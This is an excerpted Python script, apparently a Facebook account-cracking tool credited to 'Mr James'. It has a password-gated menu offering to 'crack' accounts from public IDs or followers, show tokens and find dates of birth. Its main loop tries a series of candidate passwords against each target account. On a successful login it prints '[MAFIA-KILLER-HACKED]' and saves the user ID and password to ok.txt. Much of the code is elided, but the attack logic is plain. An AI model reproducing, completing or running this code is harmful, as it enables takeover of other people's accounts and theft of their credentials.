...
#Recode Mr James.
import os, sys
CorrectUsername = 'pak123'
CorrectPassword = 'pak123'
loop = 'true'
while loop == 'true':
...
def login():
    ...
    print("")
    print("\x1b[1;91m[1] Token Login")
    print("\x1b[1;93m[2] ID/Pass Login")
    print("")
    login_select()
def login_select():
...
def b_menu():
    ...
    try:
        ...
        print("")
        time.sleep(1)
        raw_input("\033[1;31m Press Enter To Try Algain \033[0;97m")
        b_menu()
    os.system("clear")
    logo()
    print("")
    ...
    print("")
    print("\033[1;31m[1] Crack From Public Id")
    print("\033[1;32m[2] Crack From Followers")
    print("\033[1;33m[3] Show Token")
    print("\033[1;35m[4] Find Date Of Birth")
    print("\033[1;36m[5] Return Method Menu")
    print("\033[1;37m[6] Logout")
    print("")
    b_menu_select()
def b_menu_select():
	select = raw_input("\nChoose Option >>> ")
		...
		try:
		    ...
		    if 'www.facebook.com' in d['error_msg']:
		    	...
		    	if "access_token" in d:
		            print("\033[1;32m[MAFIA-KILLER-HACKED] \033[1;30m"+uid+" | "+pass1+"\x1b[1;0m")
		            ok=open("ok.txt","a")
		            ok.write(uid+" | "+pass1+"\n")
		            ok.close()
		            oks.append(uid)
		            ...
		            if 'www.facebook.com' in d['error_msg']:
		                ...
		                if 'access_token' in d:
		                    print("\033[1;32m[MAFIA-KILLER-HACKED] \033[1;30m"+uid+" | "+pass2+"\x1b[1;0m")
		                    ok=open("ok.txt","a")
		                    ok.write(uid+" | "+pass2+"\n")
		                    ok.close()
		                    oks.append(uid)
		                    ...
		                    if 'www.facebook.com' in d['error_msg']:
		                        ...
		                        if 'access_token' in d:
		                            print(" \033[1;32m[MAFIA-KILLER-HACKED] \033[1;30m"+uid+" | "+pass3+"\x1b[1;0m")
		                            ok=open("ok.txt","a")
		                            ok.write(uid+" | "+pass3+"\n")
		                            ok.close()
		                            oks.append(uid)
		                            ...
		                            if 'www.facebook.com' in d['error_msg']:
		                                ...
		                                if 'access_token' in d:
		                                    print("\033[1;32m[MAFIA-KILLER-HACKED] \033[1;30m"+uid+" | "+pass4+"\x1b[1;0m")
		                                    ok=open("ok.txt","a")
		                                    ok.write(uid+" | "+pass4+"\n")
		                                    ok.close()
		                                    oks.append(uid)
		                                    ...
		                                    if 'www.facebook.com' in d['error_msg']:
		                                        ...
		                                        if 'access_token' in d:
		                                            print("\033[1;32m[MAFIA-KILLER-HACKED] \033[1;30m"+uid+" | "+pass5+"\x1b[1;0m")
		                                            ok=open("ok.txt","a")
		                                            ok.write(uid+" | "+pass5+"\n")
		                                            ok.close()
		                                            oks.append(uid)
		                                            ...
		                                            if 'www.facebook.com' in d['error_msg']:
		                                                ...
		                                                if 'access_token' in d:
		                                                    print("\033[1;32m[MAFIA-KILLER-HACKED] \033[1;30m"+uid+" | "+pass6+"\x1b[1;0m")
		                                                    ok=open("ok.txt","a")
		                                                    ok.write(uid+" | "+pass6+"\n")
		                                                    ok.close()
		                                                    oks.append(uid)
		                                                    ...
		                                                    if 'www.facebook.com' in d['error_msg']:
		                                                        ...
		                                                        if 'access_token' in d:
		                                                            print("\033[1;32m[MAFIA-KILLER-HACKED] \033[1;30m"+uid+" | "+pass7+"\x1b[1;0m")
		                                                            ok=open("ok.txt","a")
		                                                            ok.write(uid+" | "+pass7+"\n")
		                                                            ok.close()
		                                                            oks.append(uid)
